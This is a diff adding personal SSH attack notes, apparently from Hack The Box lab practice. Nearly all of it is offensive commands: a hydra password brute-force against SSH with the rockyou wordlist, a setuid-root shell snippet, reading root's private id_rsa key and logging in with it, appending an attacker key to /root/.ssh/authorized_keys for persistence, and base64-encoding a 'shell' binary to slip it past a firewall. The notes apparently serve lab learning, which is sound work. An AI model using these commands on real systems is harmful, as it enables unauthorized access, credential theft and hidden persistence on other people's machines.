@@ -1,0 +1,64 @@
+## SSH
+
+## download files from target 
+    scp -r username@remote:/path/to/folder/ /dest/local/path
+    
+    hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.105 -t 4 ssh
+
+    if you gain ssh try:
+    python
+        import os
+        os.setuid(0)
+        os.system("/bin/bash")
+
+    See if we can read ls -la /root/.ssh/id_rsa
+
+    if we gain access we can create our own SSH key to connect later
+
+        This will give us two files: key (which we will use with ssh -i) and key.pub, which we will copy to the remote machine. Let us copy key.pub, then on the remote machine, we will add it into /root/.ssh/authorized_keys:
+
+         ssh-keygen -f my_key_for_later
+
+            Generating public/private rsa key pair.
+            Enter passphrase (empty for no passphrase): *******
+            Enter same passphrase again: *******
+
+            Your identification has been saved in key
+            Your public key has been saved in key.pub
+            The key fingerprint is:
+            SHA256:...SNIP... user@parrot
+            The keys randomart image is:
+            +---[RSA 3072]----+
+            |   ..o.++.+      |
+            ...SNIP...
+            |     . ..oo+.    |
+            +----[SHA256]-----+
+        
+        echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
+
+        ssh root@10.10.10.10 -i key
+
+## if you can cat /root/.ssh/id_rsa
+
+    we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and use it to log in to the server. If we can read the /root/.ssh/ directory and can read the id_rsa file, we can copy it to our machine and use the -i flag to log in with it:
+
+    cat /root/.ssh/id_rsa
+    copy and paste
+        hydr0burn@htb[/htb]$ vim id_rsa
+        hydr0burn@htb[/htb]$ chmod 600 id_rsa
+        hydr0burn@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
+
+## base64
+    In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
+
+    hydr0burn@htb[/htb]$ base64 shell -w 0
+
+    f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
+
+        Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:
+
+        user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+
+## to create and allow ssh on my computer (super annoying)
+    ssh-keygen -t rsa
+    ssh-copy-id username@host
